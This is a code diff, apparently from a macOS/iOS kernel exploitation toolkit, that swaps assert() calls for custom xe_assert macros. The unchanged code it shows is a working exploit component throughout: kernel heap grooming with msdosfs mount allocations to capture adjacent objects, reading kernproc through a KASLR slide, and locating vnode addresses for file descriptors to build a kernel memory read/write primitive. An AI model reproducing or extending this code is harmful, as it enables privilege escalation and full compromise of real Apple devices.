@@ -6,7 +6,6 @@
 //
 
 
-#include <assert.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -27,6 +26,7 @@
 #include "kmem_remote.h"
 #include "xnu_proc.h"
 #include "slider.h"
+#include "util_assert.h"
 
 
 void capture_msdosfs_mount_pair(uintptr_t* ptr1_out, xe_allocator_msdosfs_t* alloc1_out, uintptr_t* ptr2_out, xe_allocator_msdosfs_t* alloc2_out) {
@@ -34,7 +34,7 @@ void capture_msdosfs_mount_pair(uintptr_t* ptr1_out, xe_allocator_msdosfs_t* all
     
     slot_id_t slots[count];
     int error = gym_multi_alloc_mem(TYPE_MSDOSFSMOUNT_SIZE, slots, XE_ARRAY_SIZE(slots));
-    assert(error == 0);
+    xe_assert_err(error);
     
     uintptr_t addrs[count];
     error = xe_util_dispatch_apply(addrs, sizeof(addrs[0]), XE_ARRAY_SIZE(addrs), slots, ^(void* ctx, void* data, size_t idx) {
@@ -47,7 +47,7 @@ void capture_msdosfs_mount_pair(uintptr_t* ptr1_out, xe_allocator_msdosfs_t* all
         return gym_destructible_free(*addr);
     });
     
-    assert(error == 0);
+    xe_assert_err(error);
     
     xe_allocator_msdosfs_t msdosfs_allocators[128];
     bzero(msdosfs_allocators, XE_ARRAY_SIZE(msdosfs_allocators));
@@ -57,7 +57,7 @@ void capture_msdosfs_mount_pair(uintptr_t* ptr1_out, xe_allocator_msdosfs_t* all
         snprintf(label, sizeof(label), "xe_%ld", idx);
         return xe_allocator_msdosfs_create(label, (xe_allocator_msdosfs_t*)data);
     });
-    assert(error == 0);
+    xe_assert_err(error);
     
     int capture_idxs[count];
     error = xe_util_dispatch_apply(capture_idxs, sizeof(capture_idxs[0]), XE_ARRAY_SIZE(capture_idxs), slots, ^(void* ctx, void* data, size_t idx) {
@@ -92,7 +92,7 @@ void capture_msdosfs_mount_pair(uintptr_t* ptr1_out, xe_allocator_msdosfs_t* all
         
         return 0;
     });
-    assert(error == 0);
+    xe_assert_err(error);
     
     xe_allocator_msdosfs_t captured[count];
     for (int i=0; i<count; i++) {
@@ -109,7 +109,7 @@ void capture_msdosfs_mount_pair(uintptr_t* ptr1_out, xe_allocator_msdosfs_t* all
         return xe_allocator_msdosfs_destroy((xe_allocator_msdosfs_t*)data);
     });
     
-    assert(error == 0);
+    xe_assert_err(error);
     
     *ptr1_out = addrs[0];
     *ptr2_out = addrs[1];
@@ -132,27 +132,27 @@ int main(int argc, const char* argv[]) {
     xe_kmem_read(helper_data_backup, helper_addr, sizeof(helper_data_backup));
     
     char temp_dir[PATH_MAX] = "/tmp/xe_kmem_XXXXXXX";
-    assert(mkdtemp(temp_dir) != NULL);
+    xe_assert(mkdtemp(temp_dir) != NULL);
     
     char path[PATH_MAX];
     snprintf(path, sizeof(path), "%s/worker_bridge", temp_dir);
     int worker_bridge_fd = open(path, O_CREAT | O_RDWR);
-    assert(worker_bridge_fd >= 0);
+    xe_assert(worker_bridge_fd >= 0);
     
     snprintf(path, sizeof(path), "%s/helper_bridge", temp_dir);
     int helper_bridge_fd = open(path, O_CREAT | O_RDWR);
-    assert(helper_bridge_fd >= 0);
+    xe_assert(helper_bridge_fd >= 0);
     
     uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_slide(VAR_KERNPROC_ADDR));
-    uintptr_t proc = xe_xnu_proc_current_proc(kernproc);
+    uintptr_t proc = xe_xnu_proc_current_proc();
     
     uintptr_t worker_bridge_vnode;
     int error = xe_xnu_proc_find_fd_data(proc, worker_bridge_fd, &worker_bridge_vnode);
-    assert(error == 0);
+    xe_assert_err(error);
     
     uintptr_t helper_bridge_vnode;
     error = xe_xnu_proc_find_fd_data(proc, helper_bridge_fd, &helper_bridge_vnode);
-    assert(error == 0);
+    xe_assert_err(error);
     
     struct kmem_msdosfs_init_args args;
     xe_kmem_read(args.worker_data, worker_addr, sizeof(args.worker_data));
